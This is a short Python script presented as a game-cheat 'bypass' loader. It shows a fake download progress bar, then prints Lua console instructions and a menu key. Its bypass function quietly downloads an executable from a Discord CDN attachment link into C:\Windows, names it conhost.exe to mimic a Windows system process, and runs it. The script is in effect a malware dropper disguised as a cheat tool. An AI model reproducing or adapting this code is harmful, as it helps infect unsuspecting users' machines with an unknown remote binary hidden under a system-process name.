import os
import time
import requests


def dllconn():
    from time import sleep
    from tqdm import tqdm
    print("         DOWNLOADING BYPASS")
    for i in tqdm(range(3)):
        sleep(1.3)
def bypass():
    def download(url: str, dest_folder: str):
        if not os.path.exists(dest_folder):
            os.makedirs(dest_folder)
        filename = url.split('/')[-1].replace(" ", "_")
        file_path = os.path.join(dest_folder, filename)

        r = requests.get(url, stream=True)
        if r.ok:

            with open(file_path, 'wb') as f:
                for chunk in r.iter_content(chunk_size=1024 * 8):
                    if chunk:
                        f.write(chunk)
                        f.flush()
                        os.fsync(f.fileno())
        else:
            print("Injection Failed")
    download("https://cdn.discordapp.com/attachments/1023332137052684401/1023338729202524160/conhost.exe",dest_folder="C:\\Windows")
    from time import sleep
    from tqdm import tqdm
    for i in tqdm(range(3)):
        sleep(0.5)
        os.system("cls")
        os.startfile("C:\\Windows\\conhost.exe")
        import download
def comp():
    os.system("cls")
    print("\n1.COPY AND PASTE INTO (~) CONSOLE: lua_openscrip_cl craig.lua\n")
    print("\nMENU IS [INSERT] KEY \n")
    print("\nENJOY! ~ Craig <3\n")
    input()


dllconn()
bypass()



